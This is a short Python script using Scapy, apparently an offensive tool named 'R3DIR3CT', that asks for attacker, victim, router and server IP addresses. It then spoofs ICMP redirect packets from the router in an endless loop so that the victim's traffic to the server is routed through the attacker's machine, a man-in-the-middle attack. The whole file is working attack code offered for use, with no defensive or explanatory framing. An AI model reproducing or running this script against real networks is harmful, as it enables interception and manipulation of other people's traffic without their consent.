#!/usr/bin/python3

import sys
from termcolor import colored
from scapy.all import *

banner = colored("""
    ____ _____ ____  ________ _____ ____________           
   / __ \__  // __ \/  _/ __ \__  // ____/_  __/___  __  __
  / /_/ //_ </ / / // // /_/ //_ </ /     / / / __ \/ / / /
 / _, _/__/ / /_/ // // _, _/__/ / /___  / / / /_/ / /_/ / 
/_/ |_/____/_____/___/_/ |_/____/\____/ /_(_) .___/\__, /  
                                           /_/    /____/   


@rootshooter				     
""", "green")

print(banner)

attacker = input("Enter your IP address: ")
victim = input("Enter target IP address: ")
router = input("Enter router IP address: ")
server = input("Enter server IP address: ")

ip = IP()
ip.src = router
ip.dst = victim
redirect = ICMP()
redirect.type = 5
redirect.code = 1
redirect.gw = attacker


payIP = IP()
payIP.src = victim
payIP.dst = server
tcp = TCP()
tcp.flags = "S"
tcp.dport = 80
tcp.seq = 444444444
tcp.sport = 55555


while True:
	print(colored("[+] Sending payload", "green"))
	send(ip/redirect/payIP/tcp)